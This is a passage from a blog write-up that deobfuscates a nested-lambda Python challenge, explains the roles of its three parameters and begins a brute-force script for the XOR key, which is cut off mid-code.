<figure class='code'><figcaption><span>lambda, dictionary & setitem</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [8]: d = {}
</span><span class='line'>In [9]: z(d)
</span><span class='line'>Out[9]:
</span><span class='line'>{&#39;!&#39;: [1375,
</span><span class='line'>  ...
</span><span class='line'> &#39;l0&#39;: [1375,
</span><span class='line'>  ...
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>That lambda is even called with a dictionary that will contain, among other things, the three user controlled variable: <em>g</em>, <em>c</em>, <em>d</em>.
That dictionary seems to be some kind of storage used to keep track of all the variables that will be used across those lambdas.</p>

<figure class='code'><figcaption><span>lambda & the resulting dictionary</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Returns { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;$&#39;:None, &#39;!&#39;:tab0, &#39;l0&#39;:tab0}</span>
</span><span class='line'><span class="n">last_res</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>    <span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>            <span class="n">x</span>
</span><span class='line'>        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
</span><span class='line'><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>..then the one before&hellip;</h2>

<p>Now if we repeat that same operation with the one before the last lambda, we have the exact same pattern:</p>

<figure class='code'><figcaption><span>lambda before the last one</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">tab1</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="mi">1373</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1280</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1375</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1366</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1360</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1362</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1352</span><span class="p">,</span> <span class="mi">1374</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1302</span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">zz</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab1</span><span class="p">),</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>    <span class="n">x</span>
</span><span class='line'><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, now let&rsquo;s repeat the same operations over and over again. At some point, the whole thing becomes crystal clear (sort-of):</p>

<figure class='code'><figcaption><span>cleaned nested lambdas</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Returns { </span>
</span><span class='line'>  <span class="c"># &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d,</span>
</span><span class='line'>  <span class="c"># &#39;!&#39;:[],</span>
</span><span class='line'>  <span class="c"># &#39;s&#39;:[],</span>
</span><span class='line'>  <span class="c"># &#39;l&#39;:[j for i in zip(tab0, tab1) for j in i],</span>
</span><span class='line'>  <span class="c"># &#39;l1&#39;:tab1,</span>
</span><span class='line'>  <span class="c"># &#39;l0&#39;:tab0,</span>
</span><span class='line'>  <span class="c"># &#39;i&#39;: 0,</span>
</span><span class='line'>  <span class="c"># &#39;j&#39;: 1302,</span>
</span><span class='line'>  <span class="c"># &#39;$&#39;:None</span>
</span><span class='line'><span class="c">#}</span>
</span><span class='line'><span class="n">res_after_all_operations</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>  <span class="p">(</span>
</span><span class='line'>    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[]),</span>
</span><span class='line'>        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>        <span class="n">x</span>
</span><span class='line'>    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'>  <span class="c"># ..</span>
</span><span class='line'>  <span class="p">(</span>
</span><span class='line'>    <span class="p">(</span>
</span><span class='line'>      <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>          <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">))),</span>
</span><span class='line'>          <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>          <span class="n">x</span>
</span><span class='line'>      <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="c"># ..</span>
</span><span class='line'>    <span class="p">(</span>
</span><span class='line'>      <span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;j&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span> <span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;zip&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;zip&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">zip</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l0&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l0&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l0</span><span class="p">),</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l1&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l1&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l1</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]),</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>            <span class="n">x</span>
</span><span class='line'>        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>      <span class="c"># Returns { &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d, &#39;!&#39;:tab1, &#39;l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;$&#39;:None}</span>
</span><span class='line'>      <span class="p">(</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>          <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>              <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab1</span><span class="p">),</span>
</span><span class='line'>              <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>              <span class="n">x</span>
</span><span class='line'>          <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>        <span class="c"># Return { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39;:tab0, &#39;l0&#39;:tab0, &#39;$&#39;:None }</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>          <span class="p">(</span>
</span><span class='line'>            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                <span class="n">x</span>
</span><span class='line'>            <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>          <span class="p">)</span>
</span><span class='line'>          <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Putting it all together</h2>

<p>After doing all of that, we know now the types of the three variables the function needs to work properly (and we don&rsquo;t really need more to be honest):</p>

<ul>
<li><em>g</em> is an integer that will be mod 4

<ul>
<li>if the value is divisible by 4, the function returns nothing ; so we will need to have this variable sets to 1 for example</li>
</ul>
</li>
<li><em>c</em> is another integer that looks like a xor key ; if we look at the snippet, this variable is used to xor each byte of <em>x[&lsquo;l&rsquo;]</em> (which is the table with tab0 and tab1)

<ul>
<li>this is the interesting parameter</li>
</ul>
</li>
<li><em>d</em> is another integer that we can also ignore: it&rsquo;s only used to set <em>x[&lsquo;i&rsquo;]</em> to zero by xoring <em>x[&rsquo;d&#8217;]</em> by itself.</li>
</ul>


<p>We don&rsquo;t need anything else really now: no more lambdas, no more pain, no more tears. It is time to write what I call, an <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/bf_with_lambdas_cleaned.py"><em>educated</em> brute-forcer</a>, to find the correct value of <em>c</em>:</p>

<figure class='code'><figcaption><span>bf_with_lambdas_cleaned.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">):</span>
</span><span class='line'>    <span class="n">tab0</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1375</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1295</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span><span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1292</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1291</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span><span class="mi">1373</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span><span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1371</span><span class="p">]</span>
</span><span class='line'>    <span class="n">tab1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1373</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span><span class="mi">1289</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span><span class="mi">1375</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1360</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1362</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1352</span><span class="p">,</span> <span class="mi">1374</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1302</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">func</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="n">g</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;chr&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;chr&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">chr</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">x</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]])),</span>
</span><span class='line'>                <span class="n">x</span>
</span><span class='line'>            <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>        <span class="p">(</span>
</span><span class='line'>            <span class="p">(</span>
</span><span class='line'>                <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>                    <span class="p">(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="n">f</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">x</span><span class="p">))</span>
</span><span class='line'>                <span class="p">(</span>
</span><span class='line'>                    <span class="p">(</span>
</span><span class='line'>                        <span class="k">lambda</span> <span class="n">__</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>                        <span class="p">(</span>
</span><span class='line'>                            <span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">__</span><span class="p">(</span><span class="n">__</span><span class="p">,</span> <span class="n">x</span><span class="p">))</span>
</span><span class='line'>                            <span class="p">(</span>
</span><span class='line'>                                <span class="c"># i += 1</span>
</span><span class='line'>                                <span class="p">(</span>
</span><span class='line'>                                    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span>
</span><span class='line'>                                        <span class="n">x</span>
</span><span class='line'>                                    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                                <span class="p">)</span>
</span><span class='line'>                                <span class="p">(</span>
</span><span class='line'>                                    <span class="c"># s += [c ^ l[i]]</span>
</span><span class='line'>                                    <span class="p">(</span>
</span><span class='line'>                                        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="p">(</span>
